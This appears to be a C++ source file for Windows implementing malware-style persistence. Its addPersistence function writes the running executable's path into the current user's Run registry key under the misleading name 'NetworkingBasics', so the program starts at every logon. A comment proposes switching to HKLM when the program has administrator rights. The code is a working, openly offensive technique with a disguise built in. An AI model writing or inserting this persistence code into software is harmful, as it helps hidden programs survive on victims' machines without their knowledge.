#include <windows.h>
#include <iostream>
//Note that this depends on advapi32.lib
using namespace std;

#define WIN_32_LEAN_AND_MEAN

/*
* Adds a registry value with data to a oepened registry key 
*/
void SetVal(HKEY hKey, LPCTSTR lpValue, string data)
{
	const char *x = data.c_str();
	RegSetValueEx(hKey, lpValue, NULL, REG_SZ, (LPBYTE)data.c_str(), data.size());
}

void writeToHKCU(char * key, char * name, std::string value)
{
	HKEY hKey;
	DWORD dwDisposition;

	//Get a handle to the open key requested, save it to hKey
	RegOpenKeyEx(
	HKEY_CURRENT_USER,
	key,
	0,
	KEY_WRITE,
	&hKey
	);

	//Create the key
	RegCreateKeyEx(
	  HKEY_CURRENT_USER,
	  key, 
	  0,
	  NULL,
	  REG_OPTION_NON_VOLATILE,
	  KEY_ALL_ACCESS,
	  NULL,
	  &hKey,
	  &dwDisposition
	);
	
	//Sets the value of the key and closes it 
    SetVal(hKey, name, value);
    RegCloseKey(hKey);
}

void addPersistence(){
	/*
	Get the filepath. Note that quotes are then added around the filepath.
	This is because if there are spaces in a path, issues can be caused unless the path is quoted.
	*/
	char filepath[MAX_PATH+3];
	GetModuleFileName(NULL,filepath+1,MAX_PATH);
	int pathSize = strlen(filepath+1);
	filepath[0]='\"';
	filepath[pathSize+1]='\"';
	filepath[pathSize+2]='\0';
	printf("Filepath: %s\n",filepath);

	/*
	Write our path to the run key of HKCU, meaning that every time the current user logs in this executable will run.
	In the future, it might be smarter to detect if we are running as administrator and if so, write to HKLM instead of HKCU.
	It currently writes the key with the name NetworkingBasics, however this is entirely arbitrary.
	*/
	writeToHKCU("Software\\Microsoft\\Windows\\CurrentVersion\\Run","NetworkingBasics",string(filepath));
}
